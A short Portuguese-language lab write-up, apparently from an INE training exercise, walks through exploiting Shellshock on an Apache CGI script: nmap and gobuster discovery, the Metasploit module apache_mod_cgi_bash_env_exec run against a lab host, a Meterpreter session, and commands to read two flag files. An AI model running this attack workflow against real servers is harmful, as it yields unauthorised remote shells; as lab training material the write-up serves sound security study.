## Exploração Apache CGI (Shellshock)

### 1. Descoberta

- Scan de portas:

nmap -sS -sV target1.ine.local

- Enumerar diretórios:

gobuster dir -u http://target1.ine.local -w wordlist.txt

- Encontrar `/cgi-bin/` e arquivos `.cgi`

---

### 2. Identificar CGI vulnerável

Exemplo encontrado:

/cgi-bin/browser.cgi

---

### 3. Explorar com Metasploit

use exploit/multi/http/apache_mod_cgi_bash_env_exec  
set RHOSTS target1.ine.local  
set TARGETURI /cgi-bin/browser.cgi  
run

Sessão aberta:

Meterpreter session opened

---

### 4. Navegação

ls  
cd /opt/apache/htdocs  
ls  
cat .flag.txt

FLAG2 encontrada.

---

### 5. Buscar FLAG1

cd /  
search -f flag  
cd /tmp  
ls  
cat flag